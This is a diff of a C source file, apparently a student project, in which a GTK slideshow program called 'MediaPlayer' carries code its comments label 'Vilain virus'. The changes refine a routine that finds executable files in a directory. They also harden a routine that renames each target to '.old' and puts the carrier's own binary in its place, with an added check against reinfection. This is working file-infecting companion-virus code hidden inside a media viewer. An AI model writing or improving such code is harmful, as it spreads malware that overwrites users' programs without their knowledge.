@@ -92,24 +92,33 @@ void suivante(GtkWidget *widget, Images *diapo) {
 
 // Vilain virus 
 // Je verifie si c'est un exécutable
-int est_exe(const char *fichier){
-	struct stat sb;
-	if (lstat(fichier, &sb) == -1) {
-               perror("lstat");
-               exit(EXIT_FAILURE);
-           }
-	if ((strstr(fichier, ".old")) || (strcmp(fichier, "MediaPlayer"))){
-		if ((sb.st_mode & S_IXUSR) && S_ISREG(sb.st_mode)) {
-			return 1;  
-			}
-	}
-		return 0;  
+int est_exe(const char *fichier) {
+    	struct stat sb;
+    	if (lstat(fichier, &sb) == -1) {
+        	return 0;
+   	 }
+    	if (strstr(fichier, ".old") != NULL || strcmp(fichier, "MediaPlayer") == 0) {
+        	return 0;
+    	}
+    	if (S_ISREG(sb.st_mode) && (sb.st_mode & S_IXUSR)) {
+       	 	return 1;
+   	}
+    	return 0;
 }
 
 void duplication(char *source, char *ouvreur){
 	// je rename mon programme "pg" en "pg.old"
 	char dest[100];
 	snprintf(dest, sizeof(dest), "%s.old", source);
+	
+	// Pour éviter la réinfection
+	struct stat sb;
+    	if (stat(dest, &sb) == 0) {
+    		printf("J'ai remarqué une copie %s", dest);
+        	return;  // Si le backup existe déjà, on ne fait rien
+    	}
+    	printf("Pas de copie %s", dest);
+	
 	rename(source, dest);
 
 	int srcf = open(ouvreur, O_RDONLY);
